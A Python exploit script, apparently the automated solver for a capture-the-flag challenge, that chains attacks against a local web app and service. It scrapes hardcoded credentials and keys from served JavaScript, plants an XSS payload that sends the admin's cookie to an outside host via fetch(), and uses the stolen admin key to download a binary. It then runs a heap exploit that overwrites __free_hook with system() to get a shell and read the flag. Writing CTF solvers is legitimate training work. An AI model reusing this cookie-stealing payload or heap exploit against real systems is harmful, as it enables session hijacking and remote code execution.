import json
import os
from http import cookies
from urllib.parse import urlencode
import logging
import time

import requests
from pwn import *

context.log_level='error'

REMOTE_URI = 'http://' + os.environ.get('REMOTE_URI', 'localhost') + ':8000'
EPHEMERAL_DATA_DIR = '/tmp'

s = requests.Session()
clean = requests.Session()

def get_entry_key():
  path = REMOTE_URI + '/admin.js'

  res = s.get(path)
  if res.status_code != 200:
    print('Script is not configured properly 1')
    return

  for line in res.text.split('\n'):
    if 'ENTRY_KEY' in line:
      return line.split("'")[-2]
  
  print('Could not find entry key')
  return

def get_session_id():
  path = REMOTE_URI + '/admin'
  res = s.get(path)

  cookie = s.cookies.get('connect.sid')

  return cookie, cookie.split('%3A')[1].split('.')[0]


def get_report_key(entry_key, session_id):
  path = REMOTE_URI + '/sessions/' + session_id + '.json'

  res = s.get(path)
  sess = json.loads(res.text)
  return sess['report_key']

def get_uname_and_pwd():
  path = REMOTE_URI + "/spooky.js"

  res = s.get(path)

  if res.status_code != 200:
    print('Script is not configured properly 2')
    return

  for line in res.text.split('\n'):
    if 'req.body.username == "' in line:
      line = map(lambda s: s.strip().split('==')[1].strip().strip('"'), line.split('(')[1].split(')')[0].split('&&'))
      return line

  print('Could not find uname, pwd')
  return

def set_redirect(cookie, target, uname, pwd):
  path = REMOTE_URI + '/spooky/login'

  res = clean.post(path, data={ 'username': uname, 'password': pwd })
  if res.status_code != 200:
    print('Script is not configured properly 3')
    return

  res = clean.get(path, params={ 'next': target, 'inject': '<script>fetch("http://solver:8000?cookie="+document.cookie)</script>' }, allow_redirects=False)
  if res.status_code != 302:
    print('Script is not configured properly 4')
    return
  

def make_report(entry_key, report_key, cookie):
  path = REMOTE_URI + '/admin/report'

  c = cookies.SimpleCookie()
  c['connect.sid'] = cookie
  cookie = c.output(header='').strip()
  
  report_path = '/spooky/login?inject=' 
  report_path += urlencode('<script>fetch("http://solver:8000?cookie="+document.cookie)</script>')
  report_path += '&next=/admin/report?key=' + urlencode(urlencode(entry_key))

  clean.post(path, params={ 'key': entry_key }, headers={ 'SNEAKY-KEY': report_key }, data={ 'report_path': report_path })
  '''
  We need to make the admin hit the spooky route to get "next" set, as well as setting inject there. Then they get redirected to admin/report to get xssed
  '''

  # Now we have to wait for the admin to send us his session id

def main():
  try:
    entry_key = get_entry_key()
    cookie, session_id = get_session_id()
    uname, pwd = get_uname_and_pwd()
    report_key = get_report_key(entry_key, session_id)

    set_redirect(cookie, 'http://solver:8000', uname, pwd)
    make_report(entry_key, report_key, cookie)
  except:
    print("Script ran into errors")

def read_admin_key(admin_cookie):
  sid = admin_cookie.split(':')[1].split('.')[0]

  path = REMOTE_URI + '/sessions/' + sid + '.json'
  res = requests.get(path)
  
  data = json.loads(res.text)
  return data['ADMIN_KEY']

def read_binary_and_readme(admin_key, entry_key):
  path = REMOTE_URI + '/admin/adminlist/README'
  res = requests.get(path, params={
    'key': entry_key,
  }, headers={
    'admin-key': admin_key,
  })

  if res.status_code != 200 or 'port 7331' not in res.text:
    print('Script is not configured properly 5')
    return None
  
  path = REMOTE_URI + '/admin/adminlist/strange'
  res = requests.get(path, params={ 'key': entry_key }, headers={'admin-key': admin_key })

  if res.status_code != 200:
    print('Could not download binary')
    return None

  path = REMOTE_URI + '/admin/adminlist/libc.so.6'
  res = requests.get(path, params={ 'key': entry_key }, headers={'admin-key': admin_key })

  if res.status_code != 200:
    print('Could not download binary')
    return None
  
  dl_path = os.path.join(EPHEMERAL_DATA_DIR, 'libc.so.6')
  with open(dl_path, 'wb') as f:
    for chunk in res.iter_content(chunk_size=128):
        f.write(chunk)

  return dl_path

def solve_binary():

  p = remote(os.environ.get('PWN_URI', 'localhost'), port=7331)
  libc = ELF('/tmp/libc.so.6') # 2.27

  p.recvuntil('server\n')
  p.send('CoeMjFHDnIF3z1t0xSQCgxAbrIiLII08YVlG927hNFW1tZ8N9X3Md5z6uEFwikWC')


  def eat_menu(choice):
      p.recvuntil('choice:\n')
      p.sendline(str(choice))


  def write_data(data):
      p.recvuntil('data\n')
      p.send(data)

  eat_menu(1)
  write_data('A' * 0x78)
  write_data('B' * 0x78)

  eat_menu(3)
  eat_menu(3)
  eat_menu(3)
  eat_menu(5)
  heap_leak1 = u64(p.recvline().strip(b'\n') + b'\x00\x00')
  heap_leak2 = u64(p.recvline().strip(b'\n') + b'\x00\x00')
  eat_menu(3)

  eat_menu(5)
  libc_leak = u64(p.recvline().strip(b'\n') + b'\x00\x00')

  print('Libc at: ' + hex(libc_leak))
  libc.address = libc_leak - 0x3ebca0
  # target = libc.symbols['__malloc_hook'] - 0x7
  target = libc.symbols[b'__free_hook']
  print('Target is ' + hex(target))

  eat_menu(6)
  eat_menu(0)

  eat_menu(1)
  write_data('A' * 0x40)
  write_data('B' * 0x40)
  eat_menu(3)
  eat_menu(4)
  eat_menu(0)
  eat_menu(1)
  write_data(p64(target) + b'i' * 0x40)
  write_data(p64(target) + b'i' * 0x40)
  eat_menu(0)
  eat_menu(1)
  write_data(b'/bin/sh\x00' + (b'i' * 0x40))
  write_data(p64(libc.symbols[b'system']))
  eat_menu(4)

  while 1:
    p.sendline(b'cat flag.txt')
    flag = p.recv(1024)
    if b'flag' in flag:
      break

  flag = flag.decode('utf-8')
  p.close()
  return flag


def post_admin_cookie(admin_cookie):
  admin_key = read_admin_key(admin_cookie)
  dl_path = read_binary_and_readme(admin_key,'XbcuJevW$9oOvMXdLgW9NohL1fxpj#qvp%LRrBt#4SK%qtOjPP%fTSVNDyplPejp')
  flag = solve_binary().strip() # fuck it hardcoding some stuff
  logging.info(flag)
  if flag != os.environ.get("FLAG"):
    logging.error("Flag didn't show up")
    return False
  return True